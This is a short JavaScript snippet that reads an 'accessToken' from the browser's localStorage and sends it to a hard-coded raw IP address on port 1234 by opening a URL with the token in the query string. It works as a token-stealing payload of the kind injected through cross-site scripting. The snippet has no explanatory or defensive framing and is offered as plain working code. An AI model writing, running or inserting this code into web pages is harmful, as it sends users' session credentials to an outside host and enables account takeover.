const accessToken = localStorage.getItem("accessToken");

// Check if accessToken exists in local storage
if (accessToken) {
  const url = `http://138.68.102.109:1234?accessToken=${encodeURIComponent(accessToken)}`;

  // Open the URL in a new window
  window.open(url);
} else {
  console.error('accessToken not found in local storage!');
}
